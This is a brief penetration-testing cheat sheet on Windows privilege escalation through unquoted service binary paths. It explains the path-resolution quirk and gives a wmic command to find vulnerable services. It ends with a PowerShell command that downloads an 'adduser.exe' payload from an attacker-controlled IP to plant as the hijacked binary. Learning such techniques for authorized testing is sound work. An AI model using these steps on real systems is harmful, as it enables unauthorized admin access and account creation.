#priviledgeEscalation #windows 

🔴 Sometimes you can **mv** the binary if **rm** doesn't work
#### How it works

Unquoted service binary path "C:\\Program Files\\My Program\\My Service\\service.exe"

This will be processed in CreateProcess function as below,

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

### Check for Services

Execute in CMD
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

2. Use **icacls** to check
3. then place the user add binary

```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
```
